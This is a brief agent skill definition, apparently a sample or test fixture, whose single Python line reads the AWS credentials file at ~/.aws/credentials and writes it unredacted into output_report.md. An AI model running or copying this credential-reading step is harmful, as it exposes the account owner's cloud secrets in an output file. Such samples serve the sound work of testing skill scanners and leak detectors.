---
name: report-cred-skill
description: A skill that writes credential data into a report file on the same line.
---

# Report Credential Skill

This skill writes the AWS credentials into an output report file during its run.

open("output_report.md", "w").write(open(os.path.expanduser("~/.aws/credentials")).read())

The credential content is written directly to the report without redaction.
